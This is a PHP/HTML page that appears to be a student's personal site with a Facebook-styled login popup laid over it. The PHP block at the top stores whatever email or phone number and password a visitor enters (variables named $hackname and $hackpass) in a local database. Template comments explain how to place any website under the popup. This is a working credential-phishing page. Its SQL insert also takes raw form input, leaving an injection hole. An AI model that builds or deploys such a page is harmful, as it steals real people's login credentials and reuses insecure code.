<?php 
if ($_POST)   
{
    $host = "localhost";
    $name = "root";
    $dbpassword = "";
    $dbname = "login";
   
    $earth = mysqli_connect("$host", "$name", "$dbpassword", "$dbname");
 
    $hackname = $_POST['n'];
    $hackpass = $_POST['p']; 
    
    $result = mysqli_query($earth, "INSERT INTO `logindata` (`username`, `password`) VALUES ('$hackname', '$hackpass');");
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <link rel="stylesheet" href="style.css"> 
    
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login   
    </title> <!-- EDIT YOUR TITTLE AND HEAD HERE-->
</head>


<marquee direction=left width=100%><font face="Impact" size=12 color=red><u>Example Of A Basic Html Page</u></font></marquee>
<a href="https://mriduldahal.blogspot.com" target=_blank><img src="https://lh3.googleusercontent.com/UqCdvYKomQlTtMit0KJKOrxRVJ_pbdEIiBTA6-8BPd0ekQUlWs7YU6brRBb5f-jD1iS2x8ZpX4IhkrmoBK9ps1U2Cn_CLVKW9qSQG2hwCifjtnxdfrU-TmTxFMVBBvhk7Edk8eHBfmk3kuCnKnyjEJ3W-HSMN_ouhb1VfZO7BjqyPPTFB2tECtVz2A99VI47fHlm-Kx0BDT2YMAk_vbzVgbHNtRCNLn-kOvFKqz-h3jzKEfwOCfJwOOSz-sn3ilMq9_J2tINVOaj12Vq7IVE4nbUGq1gSqGizNHTte6kBBYpSQ2d7iilkBMysIkxADtmGS25dhjzQs-Ds3H6mZhyBrbLc3l-jJh_N_KQ1tfqZPdfueH5h9efIWdRUrwOPGHHZ6UvZPWhKzEuRFe3zh3hJdvpMvB_aMs_2wgSRlMN4OanNciqwRk-KF4LdEMdan75csleeb9GP6WU4dtWvQWKkBMc8Gua20IS9b-wkD7H6YHB6UAFePRJ-xBe-HE-AWQmB9AH208DtcogHAEe4r7pv6uQe9L10I0gU6CmwMV7i1RpWP4ndchMg2y9nSBrpQC5NG-Lsy2rByeEUYFN_9E0O0DE0yg5BCO7dFdP9Gl40WmTMdBuTuJn3UEBNBETsY4h6s2YelBqWPjP3B3X5MRvNmoqi0E0-pm0Acx902LLAURAHGCWq9BejRigMeXuUTeJIhr_6rSSiWugxrJGD2VzJBsL=w99-h95-no?authuser=0" alt="Mridul" height=75 width=75 border=2 align=right/>
</a>
<font face="Comic Sans MS" size=16 color=#753a88>Mridul Dahal</font>
<Body bgcolor=#A0CFEC>
    <div class="niranjan">
        <div class="exit"></div>
        Login With facebook
        <br><br>
        <form method="POST">
            <input type="textarea" name="n" class="btn" placeholder="Email address or phone number">
            <br><br><input type="textarea" name="p" class="btn" placeholder="Password">
            <br><br><input type="submit" class="loginbtn" value="Log In">
        </form>

        <br>
        <div class="link"><a href="#">Forgotton password?</a></div>
        <div class="line">
            <hr>
        </div>
        <button class="newaccount">Create New Account</button><br>
    </div>

    <script src="script.js"></script>

 <!-- PUT YOUR SAMPLE WEBSITE HERE THE POPUP WILL BE AUTOMATIPCALLY PLACED -->
    
  <!-- Dont Paste Your Head and tittle and body tag only after body tag place your website code -->

    <p><font size=10 color=purple>Introduction</font></p>
    <p>
    <font size=5 color=red face=Consolas>
    My name is MridulDahal.I am from Lalbandi.I read at <a href="https://goldenfutureacademy.com/" target=_blank><u>Golden Future Academy</u></a>.
    </p>
    <hr><p><font size=10 color=purple>External Links</font></p>
    <p><font face=Consolas size=5 >Its My First Website Using Html Codes. You can visit my real website. To visit <a href="https://mriduldahal.blogspot.com/" target="_blank">click here</a>.</font></p>
    <hr>
    <p><font size=10 color=purple>Programming Language</font></p>
    <p><font size=6 face=Consolas color=Purple>List Of Programming Language:</font>
    <ol><font size=5 face=Consolas>
    <li>Machine Level Language</li>
    <ul>
    <li>Binary codes</li>
    <li>0,1</li>
    </ul>
    <li>Low Level Language</li>
    <ul>
    <li>Assembly Language</li>
    </ul>
    <li>High level language</li>
    <ul>
    <li>C</li>
    <li>C++</li>
    <li>Python</li>
    <li>Javascript</li></ul></ol></font>
    </p>
    <hr>
    <p><font size=5 face=Consolas >
    For The Basic Html Codes Of This Webpage <a href="https://docs.google.com/document/d/1VP6gv7wAD9hD8FMKzPh2k9oyu44i5A1uTlEUPMzIwJg/edit?usp=sharing" target="_blank">click here</a>.
    </font></p>
    <h3><b>To know us personally go to section </b></h3><a href ="Aboutus.html"> about me </a>
    <hr>
    <p align=center>
    <FONT SIZE=4 face=consolas color=white> COPYRIGHT © 2020.CREATED BY MRIDUL DAHAL
    </p>
    <P align=center> ALL RIGHTS RESERVED </p></font>
    <a href="https://twitter.com/MridulDahalYT" target="_blank"><img src="https://www.transparentpng.com/thumb/twitter/twitter-bird-logo-pictures-0.png" height=45 width=45 align=right></a>
    <a href="https://www.instagram.com/mriduldahalyt/" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/768px-Instagram_logo_2016.svg.png" height=45 width=45 align=right></a>
    <a href="https://www.youtube.com/channel/UCuxqy0acH1PZTSFoDzxF59Q" target="_blank"><img src="https://logos-world.net/wp-content/uploads/2020/04/YouTube-Emblem.png" height=45 width=60 align=right></a>
    <a href="https://www.facebook.com/mridul.dahal.984" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" height=45 width=45 align=right></a>

    <!-- the body and html are  closed so dont put satring and ending of your html body head tittle

    only put the main website content which containqa everything expect body html head tittle tag

    manually eedit tittle on start -->
</body>

</html>
